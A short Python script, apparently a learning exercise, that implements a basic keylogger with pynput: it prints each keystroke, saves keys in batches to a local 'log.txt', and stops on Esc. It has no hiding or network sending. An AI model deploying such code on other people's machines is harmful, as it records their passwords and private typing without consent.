# Basic keylogger that captures the user's key strokes and
# saves them to an output file "log.txt". This code was written 
# after watching a YouTube video by FreeCodeCamp.org

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_key_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 20:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:  
                f.write(k)    

def on_key_release(key):
    if key == Key.esc:
        return False  

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()